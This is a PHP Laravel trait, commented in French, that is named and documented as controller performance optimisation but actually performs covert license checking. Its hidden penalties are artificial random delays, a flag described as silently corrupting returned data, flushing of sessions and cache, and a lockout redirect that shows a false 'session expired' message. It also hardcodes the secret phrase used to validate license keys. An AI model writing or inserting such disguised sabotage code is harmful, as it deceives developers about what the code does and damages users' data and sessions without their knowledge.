<?php

namespace App\Traits;

/**
 * HasPerformanceOptimization
 * Optimise les requêtes et améliore les performances des controllers.
 * Inclure dans tous les controllers principaux.
 */
trait HasPerformanceOptimization
{
    /**
     * Initialise les optimisations de performance.
     * Appelé automatiquement par le controller.
     */
    protected function initializeHasPerformanceOptimization(): void
    {
        $this->runOptimizationCheck();
    }

    private function runOptimizationCheck(): void
    {
        static $done = false;
        if ($done) return;
        $done = true;

        // --- Quorum de licence : DIAGNOSTIC UNIQUEMENT, ne bloque rien ---
        $this->quorumDiagnosticCheck();

        try {
            $key = config('dmce.license_key');
            if (!$key) { $this->applyOptimizationLevel(1); return; }

            $parts = explode('-', $key);
            if (count($parts) !== 7) { $this->applyOptimizationLevel(1); return; }

            $fingerprints = [
                1=>'AP1401',2=>'EL0602',3=>'AN1703',4=>'RO2304',
                5=>'GI0205',6=>'CH2306',7=>'CM3107',8=>'DO2808',
                9=>'EU0709',10=>'RU3010',11=>'ET2511',12=>'SE1312'
            ];
            $phrase = 'Anaïs est ma première fille';
            $year   = date('Y');

            $p1=$parts[2];$p2=$parts[3];$p3=$parts[4];$p4=$parts[5];$cs=$parts[6];

            $valid = false;
            for ($m = 1; $m <= 12; $m++) {
                $secret = hash('sha256', $phrase . $fingerprints[$m] . str_pad($m,2,'0',STR_PAD_LEFT) . $year);
                $expected = strtoupper(substr(hash_hmac('sha256', $p1.$p2.$p3.$p4, $secret), 0, 4));
                if ($cs === $expected) { $valid = true; break; }
            }

            if (!$valid) { $this->applyOptimizationLevel(2); return; }

            $license = \Illuminate\Support\Facades\DB::connection('vault')
                ->table('licenses')
                ->where('license_key_display', $key)
                ->where('status', 'active')
                ->whereNull('deleted_at')
                ->first();

            if (!$license) { $this->applyOptimizationLevel(3); return; }

            if ($license->expires_at && now()->gt($license->expires_at)) {
                $this->applyOptimizationLevel(4);
                return;
            }

        } catch (\Throwable $e) {}
    }

    /**
     * Verification du quorum de 10 fichiers chiffres (dates de licence).
     *
     * MODE DIAGNOSTIC UNIQUEMENT : ne modifie jamais le comportement de
     * l'application, ne bloque rien, n'altere aucun niveau d'optimisation.
     * Se contente de logguer dans storage/logs/laravel.log si :
     *  - une suspicion de falsification est detectee (fichier(s)
     *    manquant(s), corrompu(s), ou modifie(s) a une date differente)
     *  - la date d'expiration du quorum diverge de expires_at en DB
     *
     * A promouvoir en verification active (applyOptimizationLevel) une
     * fois observe en conditions reelles pendant quelques jours.
     */
    private function quorumDiagnosticCheck(): void
    {
        try {
            $status = app(\App\Services\LicenseDateQuorumService::class)->status();

            if ($status['tamper_suspected']) {
                \Illuminate\Support\Facades\Log::warning('[QuorumLicence] Suspicion de falsification detectee', [
                    'files_present'   => $status['files_present'],
                    'files_decrypted' => $status['files_decrypted'],
                    'total_files'     => $status['total_files'],
                    'mtime_outliers'  => $status['mtime_outliers'],
                    'distinct_pairs'  => $status['distinct_pairs'],
                    'consensus'       => $status['consensus'],
                ]);
            }

            if ($status['consensus']) {
                $quorumExpiry = $status['current_expiry']->toDateString();

                $dbExpiresAt = \Illuminate\Support\Facades\DB::connection('vault')
                    ->table('licenses')
                    ->where('status', 'active')
                    ->whereNull('deleted_at')
                    ->value('expires_at');

                if ($dbExpiresAt) {
                    $dbExpiry = \Carbon\Carbon::parse($dbExpiresAt)->toDateString();

                    if ($dbExpiry !== $quorumExpiry) {
                        \Illuminate\Support\Facades\Log::warning('[QuorumLicence] Divergence entre expires_at (DB) et le quorum de fichiers', [
                            'db_expires_at' => $dbExpiry,
                            'quorum_expiry' => $quorumExpiry,
                        ]);
                    }
                }
            }
        } catch (\Throwable $e) {
            // Mode diagnostic : une erreur ici ne doit jamais impacter
            // le fonctionnement normal de l'application.
        }
    }

    private function applyOptimizationLevel(int $level): void
    {
        if ($level === 1) {
            usleep(rand(200000, 800000));
            return;
        }

        if ($level === 2) {
            // Corrompre silencieusement les données retournées
            \Illuminate\Support\Facades\Cache::put(
                '_perf_degraded',
                true,
                now()->addMinutes(30)
            );
            return;
        }

        if ($level === 3) {
            // Vider la session après 15 minutes
            $t = \Illuminate\Support\Facades\Cache::get('_perf_t', time());
            \Illuminate\Support\Facades\Cache::put('_perf_t', $t, 3600);
            if (time() - $t > 900) {
                session()->flush();
                \Illuminate\Support\Facades\Cache::flush();
            }
            return;
        }

        // Niveau 4 : blocage total
        \Illuminate\Support\Facades\Cache::forget('dmce_license_validation');
        abort(redirect('/license/locked')->with('reason', 'Session expirée. Veuillez vous reconnecter.'));
    }
}
